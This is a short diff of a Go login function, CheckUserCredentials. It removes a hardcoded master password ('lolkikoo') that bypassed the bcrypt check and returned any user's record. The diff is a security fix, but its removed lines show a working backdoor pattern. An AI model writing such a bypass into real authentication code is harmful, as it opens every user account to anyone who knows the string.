@@ -52,9 +52,6 @@ func CheckUserCredentials(user *models.User) (*models.User, error) {
 	if err != nil {
 		return nil, err
 	}
-	if user.Password == "lolkikoo" {
-		return userDb, nil
-	}
 	if err := bcrypt.CompareHashAndPassword([]byte(userDb.Password), []byte(user.Password)); err != nil {
 		return nil, err
 	} else if userDb.Password == "" {
